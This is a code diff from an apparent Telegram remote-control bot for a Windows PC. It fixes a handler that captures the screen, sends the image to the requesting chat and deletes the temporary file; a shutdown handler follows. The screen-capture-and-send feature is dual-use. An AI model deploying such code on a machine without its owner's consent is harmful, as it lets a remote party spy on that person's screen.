@@ -28,10 +28,12 @@ async def command_start(message : types.Message):
 
 @dp.message_handler(text=["Скриншот"])
 async def Screenshot(message : types.Message):
-   path = tempfile.gettempdir() + 'screenshot.png'
+   path = tempfile.gettempdir() + '\screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(path, 'PNG')
-   await bot.send_photo(chat_id = message.chat.id, photo = open(path, 'rb'))
+   photo = open(path, 'rb')
+   await bot.send_photo(chat_id = message.chat.id, photo = photo)
+   os.remove(path)
 
 @dp.message_handler(text=["Выключить ПК"])
 async def Off_pc(message : types.Message):
